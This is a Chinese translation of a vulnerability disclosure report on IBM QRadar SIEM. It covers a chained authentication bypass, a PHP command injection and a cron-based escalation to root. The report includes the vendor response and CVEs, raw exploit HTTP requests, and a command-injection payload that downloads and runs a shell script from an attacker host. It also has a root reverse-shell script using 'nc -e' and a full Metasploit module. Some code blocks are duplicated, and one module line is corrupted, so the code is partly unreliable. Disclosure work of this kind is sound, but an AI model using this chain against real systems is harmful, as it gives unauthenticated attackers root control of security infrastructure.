# SSD报告 - QRadar远程命令执行

  
![image.png](https://image.3001.net/images/20180808/1533720976_5b6ab99092347.png!small)  

漏洞摘要

QRadar中的多个漏洞允许远程未经身份验证的攻击者使产品执行任意命令。每个漏洞本身并不像链接那么强大 -这允许用户从未经身份验证的访问更改为经过身份验证的访问，更改为运行命令，最后以root权限运行这些命令。

供应商响应

“您于1月25日向IBM报告了此漏洞，我们于4月27日通知您漏洞已修复。以下是我们公告的链接以及向您报告的独立研究人员的确认：http：//www.ibm.com/support/docview.wss？uid
= swg22015797。我们感谢您为向我们报告这些问题所做的努力，以及在IBM发布修订之前推迟您的披露。

您在报告初始报告前几周内已经意识到并且将针对权限升级报告的第三个漏洞修复为补丁。这是该特定CVE的公告：http：//www.ibm.com/support/docview.wss？uid
= swg22012293。

在我们对其他漏洞评分引发担忧后，评分已经过审核并进行了一些修正。已报告的问题已分为单独的CVE：用于身份验证绕过的新CVE-2018-1612;和现有的一个用于命令注入的非特权用户CVE-2018-1418。这些CVE的更新描述和评分如下：

CVE-2018-1612 IBM QRadar Incident Forensics可能允许远程攻击者绕过身份验证并获取敏感信息  
CVSS基数：5.8  
CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:N

CVE-2018-1418 IBM QRadar Incident Forensics可以允许经过身份验证的攻击者执行“nobody”命令。  
CVSS基数：7.4  
CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:L

初始评分中的问题是由于我们的流程中的沟通错误而导致我们正在努力改进我们的流程。 对于我们最初披露的有问题的评分，我们深表歉意。
此外，虽然验证CVE-2018-1612的修复程序包含在7.2.8补丁11中，但我们发现了7.3.1补丁2的问题，并且正在发布如www.ibm.com/support/docview.wss所述的iFix？UID
= swg22017062。 命令注入问题已在先前发布的7.3.1补丁2中修复。“

CVE

CVE-2018至1418年  
（注意，虽然只发布了一个CVE，但供应商修补了三个漏洞）

信用

一位独立的安全研究员Pedro Ribeiro向Beyond Security的SecuriTeam安全披露计划报告了此漏洞。

漏洞详细信息

QRadar有一个内置的应用程序，可以对某些文件进行取证分析。这在免费的Community
Edition中被禁用，但代码仍然存在，其中一部分仍然有效。该应用程序有两个组件，一个是用Java运行的servlet，另一个是运行PHP的主要Web应用程序。此漏洞链滥用取证应用程序的两个组件以绕过身份验证并将文件写入磁盘，然后滥用cron作业将特权升级到root。

QRadar在其所有Web应用程序前面都有一个Apache反向代理，它根据URL路由请求。发送到/ console /
*的请求将路由到主“控制台”应用程序，该应用程序不仅运行Web界面，还执行QRadar的主要功能。然后有几个辅助应用程序，例如上面描述的取证应用程序，可以在/
forensics和/ ForensicAnalysisServlet，SOLR服务器，可在/ solr和其他地方访问。

技术细节

漏洞：身份验证绕过（在ForensicAnalysisServlet中）  
攻击矢量：远程  
约束：无  
受影响的产品/版本：

  * IBM QRadar SIEM：7.3.0和7.3.1确认;可能自2014年年中以来发布的所有版本都受到影响

QRadar身份验证是通过SEC cookie完成的，这是一个会话UUID。这由在主QRadar控制台应用程序中运行的会话管理器集中管理。 SEC
cookie可以通过三种方式获得：

  * 在主控制台应用程序中登录后
  * 使用以前创建的授权令牌（也在控制台中创建）
  * 来自/etc/qradar/conf/host.token文件，该文件包含在安装时生成的UUID，内部服务使用该文件执行管理操作。

ForensicAnalysisServlet将SEC
cookie存储在HashMap中，然后在提交任何操作之前检查cookie是否对控制台应用程序有效......除了一个特定的代码路径。

函数doGetOrPost（）处理对ForensicsAnalysisServlet的所有请求。此函数执行许多操作，例如获取结果文件，检查分析请求的状态等。为了进行身份验证，请求者必须将其SEC和QRadarCSRF令牌注册到servlet。这是通过应用程序使用setSecurityTokens操作完成的，请求者使用该操作指定两个标记并使用servlet注册它们。为了对setSecurityTokens操作执行身份验证，servlet会检查host.token
SEC cookie是否随请求一起发送。

但是，如果使用setSecurityTokens操作发送forensicsManagedHostIps参数，则doGetOrPost（）会在对其进行身份验证之前将请求传递给doPassThrough（）。

doPassThrough（）还验证请求是否包含有效的SEC cookie
...在某些时候。问题是，如果我们发送setSecurityTokens动作，则在函数的开头将SEC和QRadarCSRF值添加到有效令牌的servlet
HashMap中......然后再进行验证。

通过对代码进行逆向工程，很明显未经身份验证的用户可以将任意SEC和QRadarCSRF值插入到servlet cookie HashMaps中。

为了显示这个，我们尝试向servlet发出请求，收到403错误：

请求：

    
    
    GET /ForensicsAnalysisServlet/?action=someaction HTTP/1.1
    Cookie: SEC=owned; QRadarCSRF=superowned;

回复：

    
    
    HTTP/1.1 403 Forbidden

现在我们发送请求将SEC和QRadarCSRF值添加到有效令牌列表中。
通过发送以下请求，将“拥有”和“超级”值添加到有效的SEC和QRadarCSRF令牌中：

    
    
    POST /ForensicsAnalysisServlet/?action=setSecurityTokens&forensicsManagedHostIps=something HTTP/1.1
    Cookie: SEC=owned; QRadarCSRF=superowned;
    Content-Type: application/json
    Content-Length: 44
    
    something1002,something1003,owned,superowned

服务器将响应：  
HTTP/1.1 200 OK  
{"exceptionMessageValue":"javax.servlet.ServletException: No valid forensics
analysis host token data found."}

现在我们的cookie已添加到SECCookiesMap和QradarCSRFCookiesMap中，因此我们可以在ForensicsAnalysisServlet中调用所有操作（甚至是需要经过身份验证的cookie的操作）。

所以让我们尝试重复初始请求，我们得到了403：

    
    
    GET /ForensicsAnalysisServlet/?action=someaction HTTP/1.1
    Cookie: SEC=owned; QRadarCSRF=superowned;

回复：

    
    
    HTTP/1.1 200 OK
    {"exceptionMessageValue":"javax.servlet.ServletException: No valid forensics analysis solrDocIds parameter found."}

成功！ 我们绕过了身份验证。

漏洞：命令注入（在PHP Web应用程序中）  
攻击矢量：远程  
约束：需要身份验证（可以通过漏洞＃1绕过）  
受影响的产品/版本：

  * IBM QRadar SIEM：7.3.0和7.3.1确认; 可能自2014年年中以来发布的所有版本都受到影响

此漏洞链中的第二个漏洞位于取证Web应用程序的PHP部分。 使用漏洞＃1将我们的SEC和QRadarCSRF
cookie添加到ForensicAnalysisServlet
HashMaps意味着我们可以调用应用程序的Java部分中的任何函数，但PHP部分使用单独的身份验证方案，该方案没有类似的缺陷。
但是，它接受来自localhost的任何请求，而无需身份验证。 通过包含DejaVu /
qradar_helper.php文件在PHP部分中完成身份验证，该文件调用LoginCurrentUser函数：

    
    
         public function LoginCurrentUser ($remember, &$errorInfo)
         {
         //if local server request don't need to login the user
         if($_SERVER['REMOTE_ADDR'] == $_SERVER['SERVER_ADDR'])
         {
                 return true;
         }

请注意，没有对本地请求进行身份验证不一定是漏洞，尽管这是一种不好的做法，因为它可能导致我们将要描述的这种情况。

那么我们如何才能使请求看起来像是来自localhost呢？像更改主机HTTP标头这样简单的操作将无法正常工作。幸运的是，我们可以再次利用ForensicAnalysisServlet
doPassThrough（）。在漏洞＃1中显示的片段之后，该函数继续将请求转发到forensicsManagedHostIps参数中输入的主机地址。

从反向工程代码可以清楚地知道，如果我们在forensicsManagedHostIps参数中发送127.0.0.1，我们就可以让ForensicAnalysisServlet将我们的请求转发给PHP
Web应用程序并绕过身份验证。那现在如何利用这个？在我们的PHP应用程序中，我们有file.php，它具有“get”功能，允许经过身份验证的用户从文件系统中获取某些文件。
file.php将请求转发给DejaVu / FileActions.php，它会进行一些检查以确保文件位于一组受限制的目录中：

    
    
     public static function Get()
     {
         global $TEMP_DIR, $PRODUCT_NAME, $QRADAR_PRE_URL_PATH;
                 $pcapArray = array_key_exists ( 'pcap', $_REQUEST ) ? $_REQUEST ['pcap'] : '';
                 $acceptablePaths = array("/store/forensics/case_input","/store/forensics/case_input_staging", "/store/forensics/tmp");
         $docid = array_key_exists('docid', $_GET) ? $_GET['docid'] : '';
         $guitype = array_key_exists('gui', $_GET) ? htmlspecialchars($_GET['gui'], ENT_QUOTES) : 'standard';
         $path = array_key_exists('path', $_GET) ? $_GET['path'] : '';
         if (!empty($path))
         {
                 $path = urldecode($path);
                 $path = FileActions::validate_path($path, $acceptablePaths);
                 if(empty($path))
                 {
                         QRadarLogger::logQradarError("FileActions.Get(): operation failed");
                         return;
                 }
         }
    
         if (!empty($docid)) {
             $doc = IndexQuery::GetDocument($docid, $guitype);
             if ($doc) {
                 $savedFile = new SavedFile($doc);
                 if ($savedFile->hasFile()) {
                     if ($savedFile->isLocal())
                         $savedFile->sendFile($guitype);
                     else
                         $savedFile->doProxy();
                 } else
                     send404();
             } else
                 send404();
    
         } else if (!empty($path)) {
             if (file_exists($path)) {
                 if (!SavedFile::VetFile($path, $guitype))
                     return;
                 readfile($path);
             } else
                 send404();

我们有兴趣点击的代码路径是pcapArray，如下所示。 如果我们发送带有几个pcap参数的PHP数组，Web应用程序将在发送之前将这些文件压缩：

    
    
        } else if (is_array($pcapArray)) {
            $hostname = array_key_exists('hostname', $_REQUEST) ? $_REQUEST['hostname'] : $_SERVER['SERVER_ADDR'];
            if (count($pcapArray) > 1) {
                $basename = uniqid() . ".zip";
                $zip_filename = $TEMP_DIR . "/" . $basename;
            } else {
                $zip_filename = $pcapArray[0]['pcap'];
                $basename = basename($zip_filename);
    
            }
    
            for($i = 0, $j = count($pcapArray); $i < $j ; $i++) {
                $pcapFileList[] = $pcapArray[$i]['pcap'];
            }
    
            if (count($pcapArray) > 1) {
                // More than one pcap, so zip up the files and send the zip
                $fileList = implode(' ', $pcapFileList);
                //error_log("filename >> ".$filename);
                //error_log( print_r($fileList,TRUE) );
    
        } else if (is_array($pcapArray)) {
            $hostname = array_key_exists('hostname', $_REQUEST) ? $_REQUEST['hostname'] : $_SERVER['SERVER_ADDR'];
            if (count($pcapArray) > 1) {
                $basename = uniqid() . ".zip";
                $zip_filename = $TEMP_DIR . "/" . $basename;
            } else {
                $zip_filename = $pcapArray[0]['pcap'];
                $basename = basename($zip_filename);
    
            }
    
            for($i = 0, $j = count($pcapArray); $i < $j ; $i++) {
                $pcapFileList[] = $pcapArray[$i]['pcap'];
            }
    
            if (count($pcapArray) > 1) {
                // More than one pcap, so zip up the files and send the zip
                $fileList = implode(' ', $pcapFileList);
                //error_log("filename >> ".$filename);
                //error_log( print_r($fileList,TRUE) );

这显然会导致命令注入，使用pcap文件名：

    
    
            $cmd = "/usr/bin/zip -qj $zip_filename $fileList 2>&1";
             //error_log("\$cmd =".$cmd);
    
             $result = exec($cmd, $cmd_output, $cmd_retval);
    
             $cmd = "/usr/bin/zip -qj $zip_filename $fileList 2>&1";
             //error_log("\$cmd =".$cmd);
    
             $result = exec($cmd, $cmd_output, $cmd_retval);

答对了！ 它允许我们作为httpd Web服务器用户执行代码，这是非特权的“nobody”用户。
例如，要从172.28.128.1下载并执行shell，我们可以发送以下GET请求，前提是我们已使用漏洞＃1创建有效的SEC和QRadarCSRF
cookie：

    
    
    GET /ForensicsAnalysisServlet/?forensicsManagedHostIps=127.0.0.1/forensics/file.php%3f%26&action=get&slavefile=true&pcap[0][pcap]=/rand/file&pcap[1][pcap]=$(mkdir -p /store/configservices/staging/updates && wget -O /store/configservices/staging/updates/runme http://172.28.128.1:4444/runme.sh && /bin/bash /store/configservices/staging/updates/runme)& HTTP/1.1
    Cookie: SEC=owned; QRadarCSRF=superowned;

这将需要几秒钟来处理，但最终我们的shell被下载，我们得到以下响应：

    
    
    HTTP/1.1 200 OK
    {"exceptionMessageValue":"javax.servlet.ServletException: No valid forensics analysis forensicsManagedHostIps parameter found."}

pcap [1]
[pcap]参数显示为未编码以便于读取，但实际利用此参数应该完全URL编码。如您所见，我们可以使用forensicsManagedHostIps来选择主机地址，还可以注入将要使用的URL路径。

选择要下载文件的目录时需要小心。 “nobody”用户无法写入/ tmp，但是一个很好的选择是/ store / configservices /
*，它用于各种任务，并且可由“nobody”写入。选择（和创建）/ store / configservices / staging / updates
/因为它在我们即将到来的root权限升级漏洞中起着核心作用。

漏洞：权限提升（“无人”用户到root）  
攻击矢量：本地  
约束：需要“无人”用户shell（可以通过漏洞＃2获得）  
受影响的产品/版本：

  * IBM QRadar SIEM：7.3.0和7.3.1确认;可能自2014年年中以来发布的所有版本都受到影响

完全拥有QRadar的最后一步是将我们有限的“nobody”用户的权限升级为root。  
为此，我们可以利用以下cron作业，每分钟以root身份运行：

    
    
    # Check if autoupdate should be run
    * * * * * /opt/qradar/bin/UpdateConfs.pl  > /dev/null 2>&1

代码是复杂的，因此为简洁起见，此处不会显示。但是，此Perl脚本调用checkRpm（），然后调用checkRpmStatus（）。后者将获取autoupdate_patch数据库表并检查是否还有任何条目要处理。如果文件条目名称以.rpm结尾，它将调用processRpm（），安装它，否则它将调用installMinor（），它将在文件条目上运行“sh
+ x”。这些文件条目应该在“update_download_dir”目录中，可以使用psql -U qradar
-c“从autoupdate_conf中选择值，其中key ='update_download_dir'”获取，但它是/ store /
configservices / staging / updates /默认。如漏洞＃2中所述，/ store / configservices /
*可由“nobody”写入，因此我们可以转储我们想要的任何文件，创建目录等。

幸运的是，“nobody”用户可以访问数据库 -毕竟，Java和PHP服务器进程需要访问它，并且它们作为“nobody”运行。因为“nobody”用户无法访问/
tmp目录，所以我们不能依赖无密码的本地套接字连接到数据库;所以我们必须使用TCP /
IP，这意味着我们需要数据库密码。密码位于/opt/qradar/conf/config_user.xml（可由“nobody”读取）并且以加密方式存储，但可以使用内置shell脚本的代码进行解密。

因此，一旦我们拥有了数据库密码，我们需要做的就是将该表的条目添加到我们控制的脚本中（例如/store/configservices/staging/updates/owned.sh），并在一分钟内将它以root身份运行：

    
    
    PGPASSWORD=$PASSWORD /usr/bin/psql -h localhost -U qradar qradar -c "insert into autoupdate_patch values ('owned.sh',558,'minor',false,1337,0,'',1,false,'','','',false)"

执行此权限升级并将根反向shell返回到172.28.128.1:4445的漏洞利用脚本显示为附录A.此文件可以使用漏洞＃1和＃2的组合编写，以完成完整的漏洞利用链，从而允许
未经身份验证的用户远程实现根代码执行。

附录 A：

    
    
    #!/bin/bash
    
    # our reverse shell that will be executed as root
    cat <<EOF > /store/configservices/staging/updates/superowned
    #!/bin/sh
    nc -e /bin/sh 172.28.128.1 4445
    EOF
    
    ### below is adapted from /opt/qradar/support/changePasswd.sh
    [ -z $NVA_CONF ] && NVA_CONF="/opt/qradar/conf/nva.conf"
    NVACONF=`grep "^NVACONF=" $NVA_CONF 2> /dev/null | cut -d= -f2`
    FRAMEWORKS_PROPERTIES_FILE="frameworks.properties"
    FORENSICS_USER_FILE="config_user.xml"
    FORENSICS_USER_FILE_CONFIG="$NVACONF/$FORENSICS_USER_FILE"
    
    # get the encrypted db password from the config
    PASSWORDENCRYPTED=`cat $FORENSICS_USER_FILE_CONFIG | grep WEBUSER_DB_PASSWORD | grep -o -P '(?<=>)([\w\=]*)(?=<)'`
    
    QVERSION=$(/opt/qradar/bin/myver | awk -F. '{print $1$2$3}')
    
    AU_CRYPT=/opt/qradar/lib/Q1/auCrypto.pm
    P_ENC=$(grep I_P_ENC ${AU_CRYPT} | cut -d= -f2-)
    P_DEC=$(grep I_P_DEC ${AU_CRYPT} | cut -d= -f2-)
    
    #if 7.2.8 or greater, use new method for hashing and salting passwords
    if [ $QVERSION -gt 727 ]
    then
        PASSWORD=$(perl <(echo ${P_DEC} | base64 -d) <(echo ${PASSWORDENCRYPTED}))
                [ $? != 0 ] && echo "ERROR: Unable to decrypt $PASSWORDENCRYPTED" && exit 255
    else
            AESKEY=`grep 'aes.key=' $NVACONF/$FRAMEWORKS_PROPERTIES_FILE | cut -c9-`
    
        PASSWORD=`/opt/qradar/bin/runjava.sh -Daes.key=$AESKEY com.q1labs.frameworks.crypto.AESUtil decrypt $PASSWORDENCRYPTED`
            [ $? != 0 ] && echo "ERROR: Unable to decrypt $PASSWORDENCRYPTED" && exit 255
    fi
    
    PGPASSWORD=$PASSWORD /usr/bin/psql -h localhost -U qradar qradar -c "insert into autoupdate_patch values ('superowned',558,'minor',false,1337,0,'',1,false,'','','',false)"
    
    # delete ourselves
    (sleep 2 && rm -- "$0") &

利用

    
    
    ##
    # This module requires Metasploit: http://metasploit.com/download
    # Current source: https://github.com/rapid7/metasploit-framework
    ##
    
    require 'msf/core'
    require 'securerandom'
    
    class MetasploitModule < Msf::Exploit::Remote
      Rank = ExcellentRanking
    
      include Msf::Exploit::Remote::HttpClient
      include Msf::Exploit::Remote::HttpServer
      include Msf::Exploit::EXE
    
      def initialize(info = {})
        super(update_info(info,
          'Name'           => 'IBM QRadar SIEM Unauthenticated Remote Code Execution',
          'Description'    => %q{
            IBM QRadar SIEM has three vulnerabilities in the Forensics web application
            that when chained together allow an attacker to achieve unauthenticated remote code execution.
    
            The first stage bypasses authentication by fixating session cookies.
            The second stage uses those authenticated sessions cookies to write a file to disk and execute
            that file as the "nobody" user.
            The third and final stage occurs when the file executed as "nobody" writes an entry into the
            database that causes QRadar to execute a shell script controlled by the attacker as root within
            the next minute.
            Details about these vulnerabilities can be found in the advisories listed in References.
    
            The Forensics web application is disabled in QRadar Community Edition, but the code still works,
            so these vulnerabilities can be exploited in all flavours of QRadar.
            This module was tested with IBM QRadar CE 7.3.0 and 7.3.1. Most likely all versions released since
            mid 2014 are vulnerable, as that was when the Forensics application was introduced.
    
            Due to payload constraints, this module only runs a generic/shell_reverse_tcp payload.
          },
          'Author'         =>
            [
              'Pedro Ribeiro <pedrib@gmail.com>'         # Vulnerability discovery and Metasploit module
            ],
          'License'        => MSF_LICENSE,
          'Platform'       => ['unix'],
          'Arch'           => ARCH_CMD,
          'References'     =>
            [
             ['CVE', ''],
             ['URL', 'SECURITEAM_URL'],
             ['URL', 'GITHUB_URL'],
             ['URL', 'FULLDISC_URL']
            ],
          'Targets'        =>
            [
              [ 'IBM QRadar SIEM <= LAST_VULN_VERSION', {} ],
            ],
          'Payload'        => {
            'Compat'       => {
              'ConnectionType'  => 'reverse',
            }
          },
          'DefaultOptions'  => {
            'SSL'     => true,
            # we can only run shell scripts, so set a reverse netcat payload by default
            # the payload that will be run is in the first few lines of @payload
            'PAYLOAD' => 'generic/shell_reverse_tcp',
          },
          'DisclosureDate'  => 'TBD',
          'DefaultTarget'   => 0))
        register_options(
          [
            Opt::RPORT(443),
            OptString.new('SRVHOST', [true, 'HTTP server address', '0.0.0.0']),
            OptString.new('SRVPORT', [true, 'HTTP server port', '4448']),
          ], self.class)
      end
    
      def check
        begin
          res = send_request_cgi({
            'uri'       => '/ForensicsAnalysisServlet/',
            'method'    => 'GET',
          })
          if res && res.code == 403
            return Exploit::CheckCode::Detected
          end
        rescue ::Rex::ConnectionError
          return Exploit::CheckCode::Unknown
        end
    
        Exploit::CheckCode::Safe
      end
    
      # Handle incoming requests from QRadar
      def on_request_uri(cli, request)
        print_good("#{peer} - Sending privilege escalation payload to QRadar...")
        print_good("#{peer} - Sit back and relax, Shelly will come visit soon!")
        send_response(cli, @payload)
      end
    
      # step 1 of the exploit, bypass authentication in the ForensicAnalysisServlet
      def set_cookies
        @sec_cookie = SecureRandom.uuid
        @csrf_cookie = SecureRandom.uuid
    
        post_data = "#{rand_text_alpha(rand(12)+5)},#{rand_text_alpha(rand(12)+5)}," +
          "#{@sec_cookie},#{@csrf_cookie}"
    
        res = send_request_cgi({
          'uri'       => '/ForensicsAnalysisServlet/',
          'method'    => 'POST',
          'ctype'     => 'application/json',
          'cookie'    => "SEC=#{@sec_cookie}; QRadarCSRF=#{@csrf_cookie};",
          'vars_get'  =>
          {
            'action'  => 'setSecurityTokens',
            'forensicsManagedHostIps' => "#{rand(256)}.#{rand(256)}.#{rand(256)}.#{rand(256)}"
          },
          'data'      => post_data
        })
    
        if res.code != 200
          fail_with(Failure::Unknown, "#{peer} - Failed to set the SEC and QRadar CSRF cookies")
        end
      end
    
      def exploit
        print_status("#{peer} - Attempting to exploit #{target.name}")
    
        # run step 1
        set_cookies
    
        # let's prepare step 2 (payload) and 3 (payload exec as root)
        @payload_name = rand_text_alpha_lower(3+rand(5))
        root_payload = rand_text_alpha_lower(3+rand(5))
    
        if (datastore['SRVHOST'] == "0.0.0.0" or datastore['SRVHOST'] == "::")
          srv_host = Rex::Socket.source_address(rhost)
        else
          srv_host = datastore['SRVHOST']
        end
    
        http_service = (datastore['SSL'] ? 'https://' : 'http://') + srv_host + ':' + datastore['SRVPORT'].to_s
        service_uri = http_service + '/' + @payload_name
    
        print_status("#{peer} - Starting up our web service on #{http_service} ...")
        start_service({'Uri' => {
          'Proc' => Proc.new { |cli, req|
            on_request_uri(cli, req)
          },
          'Path' => "/#{@payload_name}"
        }})
    
        home.php?mod=space&uid=154034 = %{#!/bin/bash
    
        # our payload that's going to be downloaded from our web server
        cat <<EOF > /store/configservices/staging/updates/#{root_payload}
        #!/bin/bash
        usr/bin/nc -e /bin/sh #{datastore['LHOST']} #{datastore['LPORT']} &
        EOF
    
        ### below is adapted from /opt/qradar/support/changePasswd.sh
        [ -z $NVA_CONF ] && NVA_CONF="/opt/qradar/conf/nva.conf"
        NVACONF=`grep "^NVACONF=" $NVA_CONF 2> /dev/null | cut -d= -f2`
        FRAMEWORKS_PROPERTIES_FILE="frameworks.properties"
        FORENSICS_USER_FILE="config_user.xml"
        FORENSICS_USER_FILE_CONFIG="$NVACONF/$FORENSICS_USER_FILE"
    
        # get the encrypted db password from the config
        PASSWORDENCRYPTED=`cat $FORENSICS_USER_FILE_CONFIG | grep WEBUSER_DB_PASSWORD | grep -o -P '(?<=>)([\\w\\=]*)(?=<)'`
    
        QVERSION=$(/opt/qradar/bin/myver | awk -F. '{print $1$2$3}')
    
        AU_CRYPT=/opt/qradar/lib/Q1/auCrypto.pm
        P_ENC=$(grep I_P_ENC ${AU_CRYPT} | cut -d= -f2-)
        P_DEC=$(grep I_P_DEC ${AU_CRYPT} | cut -d= -f2-)
    
        #if 7.2.8 or greater, use new method for hashing and salting passwords
        if [ $QVERSION -gt 727 ]
        then
            PASSWORD=$(perl <(echo ${P_DEC} | base64 -d) <(echo ${PASSWORDENCRYPTED}))
              [ $? != 0 ] && echo "ERROR: Unable to decrypt $PASSWORDENCRYPTED" && exit 255
        else
            AESKEY=`grep 'aes.key=' $NVACONF/$FRAMEWORKS_PROPERTIES_FILE | cut -c9-`
    
            PASSWORD=`/opt/qradar/bin/runjava.sh -Daes.key=$AESKEY com.q1labs.frameworks.crypto.AESUtil decrypt $PASSWORDENCRYPTED`
            [ $? != 0 ] && echo "ERROR: Unable to decrypt $PASSWORDENCRYPTED" && exit 255
        fi
    
    PGPASSWORD=$PASSWORD /usr/bin/psql -h localhost -U qradar qradar -c \
    "insert into autoupdate_patch values ('#{root_payload}',#{rand(1000)+100},'minor',false,#{rand(9999)+100},0,'',1,false,'','','',false)"
    
    # kill ourselves!
    (sleep 2 && rm -- "$0") &
    }
    
        # let's do step 2 then, ask QRadar to download and execute our payload
        print_status("#{peer} - Asking QRadar to download and execute #{service_uri}")
    
        exec_cmd = "$(mkdir -p /store/configservices/staging/updates && wget --no-check-certificate -O " +
          "/store/configservices/staging/updates/#{@payload_name} #{service_uri} && " +
          "/bin/bash /store/configservices/staging/updates/#{@payload_name})"
    
        payload_step2 = "pcap[0][pcap]" +
          "=/#{rand_text_alpha_lower(rand(6) + 2) + '/' + rand_text_alpha_lower(rand(6) + 2)}" +
          "&pcap[1][pcap]=#{Rex::Text::uri_encode(exec_cmd, 'hex-all')}"
    
        uri_step2 = "/ForensicsAnalysisServlet/?forensicsManagedHostIps" +
          "=127.0.0.1/forensics/file.php%3f%26&action=get&slavefile=true"
    
        res = send_request_cgi({
            'uri'       => uri_step2 + '&' + payload_step2,
            'method'    => 'GET',
            'cookie'    => "SEC=#{@sec_cookie}; QRadarCSRF=#{@csrf_cookie};",
          })
    
      # now we just sit back and wait for step 2 payload to be downloaded and executed
      # ... and then step 3 to complete. Let's give it a little more than a minute.
      sleep 80
      end
    end

作者：SecuriTeam  
翻译：i春秋翻译小组-Neo（李皓伟）  
翻译来源：<https://blogs.securiteam.com/index.php/archives/3689>

  

大家有问题可以留言，也欢迎大家到[春秋论坛](https://bbs.ichunqiu.com/portal.php?from=beef)玩耍哟~

